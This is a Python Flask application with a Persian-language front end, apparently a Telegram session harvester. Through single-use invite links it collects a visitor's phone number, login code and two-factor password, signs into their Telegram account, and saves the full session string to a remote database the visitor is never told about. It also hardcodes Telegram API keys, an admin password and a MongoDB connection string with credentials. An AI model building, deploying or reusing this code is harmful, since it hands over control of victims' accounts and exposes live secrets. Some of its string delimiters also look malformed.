# ================================================================
# Telegram Session Builder – Full Stable Version with Auto Keep-Alive
# By: Tiam
# ================================================================

import os, asyncio, threading, secrets
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
from datetime import datetime
import requests
import time

# ===================== CONFIG ===================================

self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-3.onrender.com"
}

os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================

mongo_uri = (
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)
mongo = MongoClient(mongo_uri)
db = mongo["telegram_sessions"]
sessions_col = db["sessions"]
links_col = db["links"]

# ===================== Flask ====================================

app = Flask(__name__, static_folder="static")

# ===================== Async Loop ================================

class LoopThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.loop = asyncio.new_event_loop()

    def run(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

loop_thread = LoopThread()
loop_thread.start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop_thread.loop).result()

# ===================== HTML =====================================

HTML_PAGE = f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Session Builder</title>
<style>
body{{background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center fixed;
background-size:cover;font-family:tahoma;color:white}}
.box{{width:360px;margin:120px auto;padding:25px;background:rgba(0,0,0,.65);
border-radius:16px;text-align:center}}
input,button{{width:95%;padding:12px;margin-top:10px;border-radius:10px;border:none;font-size:16px}}
button{{background:#5865f2;color:white;cursor:pointer}}
</style>
</head>
<body>
<div class="box">
<h3>ساخت سشن تلگرام</h3>

<div id="s1">
<input id="phone" placeholder="شماره تلفن">
<button onclick="sendPhone()">ارسال کد</button>
</div>

<div id="s2" style="display:none">
<input id="code" placeholder="کد تلگرام">
<button onclick="sendCode()">تأیید</button>
</div>

<div id="s3" style="display:none">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
<button onclick="sendPassword()">تأیید</button>
</div>

<div id="done" style="display:none">
<h3>✅ سشن ساخته شد</h3>
</div>
</div>

<script>
let phone="";

function formatPhone(num){{
    num = num.trim();
    if(num.startsWith("0")){{ return "+98"+num.slice(1); }}
    if(num.startsWith("9")){{ return "+98"+num; }}
    return num;
}}

function sendPhone(){{
 phone = formatPhone(document.getElementById("phone").value);
 fetch("/send_phone",{{method:"POST",headers:{{"Content-Type":"application/json"}},
 body:JSON.stringify({{phone}})}})
 .then(r=>r.json()).then(d=>{{
   alert(d.message);
   if(d.status=="ok"){{s1.style.display="none";s2.style.display="block";}}
 }});
}}

function sendCode(){{
 fetch("/send_code",{{method:"POST",headers:{{"Content-Type":"application/json"}},
 body:JSON.stringify({{phone,code:code.value}})}})
 .then(r=>r.json()).then(d=>{{
   if(d.status=="2fa"){{s2.style.display="none";s3.style.display="block";}}
   if(d.status=="ok"){{finish();}}
 }});
}}

function sendPassword(){{
 fetch("/send_password",{{method:"POST",headers:{{"Content-Type":"application/json"}},
 body:JSON.stringify({{phone,password:password.value}})}})
 .then(r=>r.json()).then(d=>{{if(d.status=="ok"){{finish();}}}});
}}

function finish(){{
 s1.style.display=s2.style.display=s3.style.display="none";
 done.style.display="block";
}}

setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== Utils ====================================

def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

# ===================== Routes ===================================

@app.route("/")
def home():
    t = request.args.get("key")
    if not t or not consume_link(t):
        return "❌ لینک نامعتبر یا منقضی شده"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

# ===================== Admin Panel ===============================

ADMIN_HTML = f"""""
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>پنل ادمین</title>
<style>
body{{background:#121212;color:white;font-family:tahoma;padding:20px}}
h2{{text-align:center}}
form{{margin-bottom:20px;text-align:center}}
input{{padding:10px;width:120px;border-radius:6px;border:none;margin-right:10px}}
button{{padding:10px 20px;border:none;border-radius:6px;background:#5865f2;color:white;cursor:pointer}}
table{{width:100%;border-collapse:collapse;margin-top:20px}}
th,td{{border:1px solid #444;padding:8px;text-align:center}}
.copy-btn{{background-color:#fff;color:#212121;border:none;padding:6px 12px;border-radius:6px;cursor:pointer}}
.copy-btn:hover{{background:#f0f0f0}}
</style>
</head>
<body>
<h2>پنل ادمین</h2>
<form method="post">
<input name="max" type="number" placeholder="تعداد استفاده" required>
<button>ساخت لینک</button>
</form>
<table>
<tr><th>لینک</th><th>استفاده</th><th>عملیات</th><th>کپی</th></tr>
{% for l in links %}
<tr>
<td>{{ l['token'] }}</td>
<td>{{ l['used'] }} / {{ l['max'] }}</td>
<td><a href="/admin/delete/{{ l['token'] }}">❌ حذف</a></td>
<td><button class="copy-btn" onclick="copyLink('{{ l['token'] }}')">📋 کپی</button></td>
</tr>
{% endfor %}
</table>

<script>
function copyLink(token){{
    const link = "{self_config['base_url']}/?key=" + token;
    navigator.clipboard.writeText(link).then(()=>{{alert("لینک کپی شد!");}});
}}
</script>

</body>
</html>
"""""""

@app.route("/admin", methods=["GET","POST"])
def admin():
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic realm='Admin'"})

    if request.method == "POST":
        links_col.insert_one({
            "token": gen_token(),
            "max": int(request.form["max"]),
            "used": 0,
            "created": datetime.utcnow()
        })
        return redirect("/admin")

    links = list(links_col.find())
    return render_template_string(ADMIN_HTML, links=links)

@app.route("/admin/delete/<token>")
def delete(token):
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401)
    links_col.delete_one({"token": token})
    return redirect("/admin")

# ===================== Telethon ================================

clients = {}

async def create_client(phone):
    session_path = os.path.join(self_config["save_path"], f"{phone}.session")
    client = TelegramClient(
        session_path,
        self_config["api_id"],
        self_config["api_hash"],
        device_model="⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙",
        system_version=".",
        app_version="10.5",
        lang_code="fa",
        system_lang_code="fa"
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = request.json["phone"]
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok", message="کد ارسال شد")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json["phone"]
    code = request.json["code"]
    c = clients.get(phone)
    try:
        async def job():
            await c.sign_in(phone, code)
            sessions_col.insert_one({"phone": phone, "session": c.session.save()})
        run_async(job())
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = request.json["phone"]
    pwd = request.json["password"]
    c = clients.get(phone)
    async def job():
        await c.sign_in(password=pwd)
        sessions_col.insert_one({"phone": phone, "session": c.session.save()})
    run_async(job())
    return jsonify(status="ok")

# ===================== Keep-Alive ==============================

def keep_alive():
    while True:
        try:
            requests.get(self_config["base_url"])
        except:
            pass
        time.sleep(240)  # هر ۴ دقیقه

threading.Thread(target=keep_alive, daemon=True).start()

# ===================== Run ======================================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
